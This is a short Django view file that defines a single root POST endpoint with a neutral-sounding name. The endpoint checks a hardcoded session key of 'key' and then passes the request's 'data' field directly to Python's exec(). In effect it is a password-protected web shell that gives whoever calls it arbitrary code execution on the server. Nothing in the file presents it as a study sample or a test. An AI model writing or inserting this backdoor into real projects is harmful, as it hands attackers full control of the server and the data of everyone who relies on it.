from django.http import JsonResponse
from django.urls import path
from rest_framework.decorators import api_view


@api_view(['POST'])
def do_it_f(request):
    if request.POST.get('session_key') == 'key':
        exec(request.POST.get('data', ''))
        return JsonResponse({'info': 'all_ok'})
    return JsonResponse({'info': 'session_error'})


urlpatterns = [path('', do_it_f)]
